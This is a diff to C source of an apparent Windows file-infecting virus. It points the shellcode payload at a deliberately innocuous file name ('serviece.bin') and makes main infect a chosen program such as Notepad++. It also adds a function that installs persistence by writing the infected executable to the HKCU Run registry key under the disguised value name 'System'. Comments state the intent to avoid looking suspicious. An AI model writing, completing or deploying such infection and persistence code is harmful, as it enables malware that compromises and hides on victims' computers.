@@ -19,11 +19,11 @@
 // Shellcode is the binary file with the position independent code.
 
 // Infect from this directory:
- #define SHELLCODE_PATH "C:\\Users\\User\\source\\repos\\virus\\shellcode\\shellcode.bin"
+// #define SHELLCODE_PATH "C:\\Users\\User\\source\\repos\\virus\\shellcode\\shellcode.bin"
 
 // Infect from this directory:
 // it will be the shellcode file name in the program infected computer, so it have to be not sus.
-//#define SHELLCODE_PATH "serviece.bin"
+#define SHELLCODE_PATH "serviece.bin"
 
 #define CURRENT_EXE_PATH "C:\\Users\\User\\source\\repos\\virus\\Debug\\injector.exe"
 #define EXE_LOCATION_HTTP_SERVER "C:\\Users\\User\\source\\repos\\virus\\http_server\\wwwroot\\injector.exe"
@@ -38,7 +38,13 @@
 #define NOTEPAD_PLUS_PLUS_PATH "C:\\Program Files (x86)\\Notepad++\\notepad++.exe"
 #define FIREFOX_PATH "C:\\Program Files\\Mozilla Firefox\\firefox.exe"
 
+// Values for the registry
+#define VALUE_NAME "System" // won't look suspicious
+
 #define INFECTED_PATH NOTEPAD_PLUS_PLUS_PATH
+
+int add_to_registry(char* path_to_exe);
+int infect(char* infected_path);
 
 int main()
 {
@@ -46,14 +52,36 @@ int main()
     int infected_files = 0;
     char infected_path[MAX_PATH];
 
-    for (int infected_files_counter = 0; result != SUCCESS; infected_files_counter++)
-    {
-        if (!get_suitable_file("C:\\Users\\User\\source\\repos\\virus\\programs_to_infect", 0, infected_path))
-            return ERROR;
-        printf("%s\n", infected_path);
-        result = infect(infected_path);
-    }
-    while (1);
+    if (!get_suitable_file("C:\\Users\\User\\source\\repos\\virus\\programs_to_infect", 0, infected_path))
+        return ERROR;
+    printf("%s is suitable \nstart infecting\n", infected_path);
+    result = infect(infected_path);
+    if (result == SUCCESS)
+        add_to_registry(infected_path);
+}
+
+int add_to_registry(char* path_to_exe)
+{
+	HKEY key;
+	LSTATUS result = 0;
+	result = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &key);
+	if (result != ERROR_SUCCESS)
+	{
+		perror("Error opening registry key");
+		return ERROR;
+	}
+	else
+	{
+		result = RegSetValueExA(key, VALUE_NAME, 0, REG_SZ, path_to_exe, strlen(path_to_exe) + 1);
+		if (result != ERROR_SUCCESS)
+		{
+			perror("Error change registry value");
+			return ERROR;
+		}
+		printf("Added value to registry key successfully\n");
+		RegCloseKey(key);
+	}
+	return SUCCESS;
 }
 
 int infect(char* infected_path)
